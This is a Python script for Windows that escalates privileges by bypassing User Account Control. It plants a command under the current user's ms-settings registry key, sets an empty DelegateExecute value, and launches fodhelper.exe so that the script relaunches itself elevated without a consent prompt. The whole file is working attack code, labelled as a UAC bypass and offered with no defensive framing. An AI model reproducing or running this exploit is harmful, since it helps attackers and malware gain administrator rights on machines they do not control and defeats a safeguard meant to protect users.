import os
import sys
import ctypes
import winreg

TARGET_FILE = r'C:\Windows\System32\cmd.exe'
FOD_HELPER = r'C:\Windows\System32\fodhelper.exe'
PYTHON_COMMAND = 'python'
REG_PATH = 'Software\Classes\ms-settings\shell\open\command'
DELEGATE_EXEC_REG_KEY = 'DelegateExecute'


def is_running_as_admin():
    """
    Checks if the script is running with administrative privileges.
    Returns True if is running as admin, False otherwise.
    """
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        raise


def create_reg_key(key, value):
    """
    Creates a reg key
    """
    try:
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)
        winreg.CloseKey(registry_key)
    except WindowsError:
        raise


def bypass_uac(command):
    """
    Tries to bypass the UAC
    """
    try:
        create_reg_key(DELEGATE_EXEC_REG_KEY, '')
        create_reg_key(None, command)
    except WindowsError:
        raise


def execute():
    if not is_running_as_admin():
        print('[!] The script is NOT running with administrative privileges')
        print('[+] Trying to bypass the UAC')
        try:
            current_dir = os.path.dirname(os.path.realpath(__file__)) + '\\' + __file__
            command = '{} /k {} {}'.format(TARGET_FILE, PYTHON_COMMAND, current_dir)
            bypass_uac(command)
            os.system(FOD_HELPER)
            sys.exit(0)
        except WindowsError:
            sys.exit(1)
    else:
        print('[+] The script is running with administrative privileges!')


if __name__ == '__main__':
    execute()
